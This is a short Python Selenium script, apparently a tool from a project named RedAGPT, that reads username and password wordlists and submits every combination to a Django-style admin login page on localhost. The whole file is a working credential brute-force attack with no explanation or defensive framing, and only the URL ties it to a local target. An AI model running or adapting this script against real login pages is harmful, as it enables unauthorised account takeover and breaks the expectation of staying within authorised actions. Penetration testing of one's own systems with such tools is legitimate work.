from selenium import webdriver

with open('/home/host/Project/Python/RedAGPT/RedAGPT/tools/data/username_list_small.txt', 'r') as userlist:
    usernames = [username.strip() for username in userlist]

with open('/home/host/Project/Python/RedAGPT/RedAGPT/tools/data/password_list_small.txt', 'r') as passwordlist:
    passwords = [password.strip() for password in passwordlist]

browser = webdriver.Firefox()
browser.get('http://127.0.0.1:8000/admin/login/')

for user in usernames:
    for passw in passwords:
        input_username = browser.find_element_by_name('username')
        input_password = browser.find_element_by_name('password')
        input_username.send_keys(user)
        input_password.send_keys(passw)
        input_password.submit()

browser.quit()